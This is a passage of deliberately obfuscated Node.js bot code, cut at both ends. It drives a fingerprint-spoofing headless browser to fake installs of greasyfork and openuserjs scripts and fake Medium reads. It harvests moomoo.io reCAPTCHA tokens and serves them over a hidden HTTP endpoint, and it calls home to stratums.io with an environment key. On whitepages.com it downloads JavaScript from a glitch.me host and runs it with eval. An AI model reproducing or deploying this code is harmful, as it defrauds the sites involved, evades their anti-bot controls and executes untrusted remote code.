      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + a0(0x18) + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + a0(0xa) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + a0(0x14) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + Z(0xd) + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    Z(0x6) + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + a0(0xe) + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + Y(0xb, 'NASm') + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xe5 + 0x9 * 0x7f + -0x1c9 * 0x2
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x4 * -0x1e4 + 0x1c7e + 0x8d * -0x26)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x56 * -0x1e + 0x1de1 * 0x1 + -0x1369), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2ae + 0x103 * -0x17 + 0x1a57), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1b7 + 0x1541 + -0x14 * 0x126;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xeef + 0xdf2 + -0xb * -0x17; w < getRandomInt(0x1 * 0xd91 + -0x375 + -0xa1b, -0x1 * -0x71d + -0x1 * 0x2345 + 0x1c2d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xf1ff + 0x194 + 0x1 * -0x933);
        }
      }();
    }, -0x419 + -0x33d * 0xc + -0xe73 * -0x3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x3a * -0x53 + -0x24f6 + 0x1228;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + a1(0x10, 'aG[#') + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1dd9 + -0x13 * -0x1e2 + -0x5ed, 0x2592 + 0x1140 + 0x36a0 * -0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x40ce + -0x7ad * 0x1d + 0x112fb);
    }, 0xa0b + 0x13e * 0x2 + -0xc23), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x601 * 0x1 + -0x6 * -0x123 + -0xcd3;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x7a3 + 0x325 * 0x5 + -0x2e9 * 0x4), await u['evaluate'](() => {
            const a2 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x2417 * -0x1 + 0x1ba + 0x15 * -0x1cd), v[a2(0x9)](), eval(v['responseTe' + 'xt']);
          }), await wait(0x33d87 * -0x3 + 0x20736 * -0xa + 0x4dc09 * 0x9);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1230 + 0xac5 * 0x2 + 0x17b * -0x2);
  })()), doFlags['doCreateSe' + a0(0x2)]) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x256a + -0xb9 * 0x19 + -0x3843 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1e4b + -0xf79 * 0x2 + 0x3 * 0xabd);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x155b + -0x1 * 0x2671 + 0x23 * 0x7d) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xc * -0xd9 + 0x363 + -0xd8e));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x11f * 0x5 + 0x1a00 + -0x1465, D['indexOf']('\x20'));
        return B ? E['slice'](0xcc3 + -0xe8 * 0x24 + 0x13dd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4282 + -0x2 * 0x182f + -0x53b * -0x4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x1f39 + -0x3c65 * -0x1 + -0x348e),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + a3(0x15) + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
